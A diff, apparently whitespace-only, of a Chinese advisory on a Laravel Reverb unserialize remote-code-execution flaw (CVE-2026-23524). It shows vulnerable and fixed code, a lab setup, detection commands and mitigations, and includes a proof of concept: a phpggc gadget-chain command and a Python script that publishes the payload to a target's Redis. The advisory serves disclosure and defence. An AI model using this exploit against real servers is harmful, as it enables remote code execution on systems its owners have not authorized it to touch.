@@ -41,28 +41,28 @@ Laravel Reverb是Laravel框架在2024年3月推出的官方WebSocket服务器，
   
 **漏洞版本（v1.6.3）：**  
 ```
-public function handle(string $payload): void{
-    $event = json_decode($payload, associative: true, flags: JSON_THROW_ON_ERROR);
+public function handle(string $payload): void{
+    $event = json_decode($payload, associative: true, flags: JSON_THROW_ON_ERROR);
 
-    // 危险：无类限制的反序列化
-    $application = unserialize($event['application']);
+    // 危险：无类限制的反序列化
+    $application = unserialize($event['application']);
 
-    // 继续处理...
+    // 继续处理...
 }
 
 ```  
   
 **修复版本（v1.7.0）：**  
 ```
-public function handle(string $payload): void{
-    $event = json_decode($payload, associative: true, flags: JSON_THROW_ON_ERROR);
+public function handle(string $payload): void{
+    $event = json_decode($payload, associative: true, flags: JSON_THROW_ON_ERROR);
 
-    // 安全：添加allowed_classes限制
-    $application = unserialize($event['application'] ?? null, [
-        'allowed_classes' => [Application::class]
-    ]);
+    // 安全：添加allowed_classes限制
+    $application = unserialize($event['application'] ?? null, [
+        'allowed_classes' => [Application::class]
+    ]);
 
-    // 继续处理...
+    // 继续处理...
 }
 
 ```  
@@ -77,17 +77,17 @@ PHP的unserialize()函数在反序列化对象时，会自动调用对象的"魔
 **攻击流程：**  
 ```
 攻击者构造恶意payload
-    ↓
+    ↓
 通过Redis PUBLISH命令注入
-    ↓
+    ↓
 Reverb服务器接收消息
-    ↓
+    ↓
 unserialize()触发gadget chain
-    ↓
+    ↓
 __wakeup()/__destruct()执行
-    ↓
+    ↓
 system()/exec()被调用
-    ↓
+    ↓
 远程代码执行成功
 
 ```  
@@ -135,18 +135,18 @@ system()/exec()被调用
 研究团队搭建了完整的漏洞复现环境：  
 ```
 # docker-compose.yml
-version: '3.8'
+version: '3.8'
 services:
-  redis:
-    image: redis:7-alpine
-    ports: ["6379:6379"]
-    command: redis-server --protected-mode no
+  redis:
+    image: redis:7-alpine
+    ports: ["6379:6379"]
+    command: redis-server --protected-mode no
 
-  reverb-vulnerable:
-    image: php:8.2-cli
-    environment:
-      REVERB_SCALING_ENABLED: "true"
-      REDIS_HOST: redis
+  reverb-vulnerable:
+    image: php:8.2-cli
+    environment:
+      REVERB_SCALING_ENABLED: "true"
+      REDIS_HOST: redis
 
 ```  
 ### POC演示  
@@ -154,23 +154,23 @@ services:
 **步骤1：生成恶意payload**  
 ```
 # 使用phpggc生成Laravel RCE利用链
-./phpggc Laravel/RCE9 system "id" -s
+./phpggc Laravel/RCE9 system "id" -s
 
 ```  
   
 **步骤2：构造攻击消息**  
 ```
-import redis
-import json
+import redis
+import json
 
 r = redis.Redis(host='目标IP', port=6379)
 
-malicious_payload = '生成的序列化字符串'
+malicious_payload = '生成的序列化字符串'
 
 message = {
-    "type": "message",
-    "application": malicious_payload,
-    "payload": {"channel": "test"}
+    "type": "message",
+    "application": malicious_payload,
+    "payload": {"channel": "test"}
 }
 
 # 发布到Reverb频道
@@ -190,7 +190,7 @@ r.publish('reverb', json.dumps(message))
 composer show laravel/reverb | grep versions
 
 # 检查是否启用水平扩展
-grep "REVERB_SCALING_ENABLED" .env
+grep "REVERB_SCALING_ENABLED" .env
 
 # 检查Redis认证状态
 redis-cli -h 你的Redis地址 PING
@@ -227,7 +227,7 @@ REVERB_SCALING_ENABLED=false
 ```
 # redis.conf
 requirepass 强密码
-bind 127.0.0.1
+bind 127.0.0.1
 protected-mode yes
 
 # .env
@@ -267,7 +267,7 @@ iptables -A INPUT -p tcp --dport 6379 -j DROP
 redis-cli MONITOR | grep PUBLISH | grep reverb
 
 # 检测异常来源IP
-awk '/PUBLISH.*reverb/ && !/内网IP/ {print}' /var/log/redis/redis-server.log
+awk '/PUBLISH.*reverb/ && !/内网IP/ {print}' /var/log/redis/redis-server.log
 
 ```  
   
@@ -275,15 +275,15 @@ awk '/PUBLISH.*reverb/ && !/内网IP/ {print}' /var/log/redis/redis-server.log
 ```
 // 在Laravel日志中添加安全监控
 Log::channel('security')->info('PubSub message received', [
-    'payload_hash' => hash('sha256', $payload),
-    'payload_size' => strlen($payload),
+    'payload_hash' => hash('sha256', $payload),
+    'payload_size' => strlen($payload),
 ]);
 
 // 检测可疑的序列化类
-if (!str_contains($serialized, 'Laravel\Reverb\Application')) {
-    Log::warning('Suspicious class detected', [
-        'serialized_preview' => substr($serialized, 0, 200),
-    ]);
+if (!str_contains($serialized, 'Laravel\Reverb\Application')) {
+    Log::warning('Suspicious class detected', [
+        'serialized_preview' => substr($serialized, 0, 200),
+    ]);
 }
 
 ```  
@@ -457,7 +457,7 @@ CVE-2026-23524是2026年第一个披露的重大安全漏洞，其严重性和�
 **关注我们**  
 : 获取最新网络安全资讯、漏洞分析和防护技术。  
   
-**#网络安全 #漏洞分析 #Laravel #PHP安全 #CVE #反序列化 #RCE #Redis安全**  
+**#网络安全 #漏洞分析 #Laravel #PHP安全 #CVE #反序列化 #RCE #Redis安全**  
   
   
 
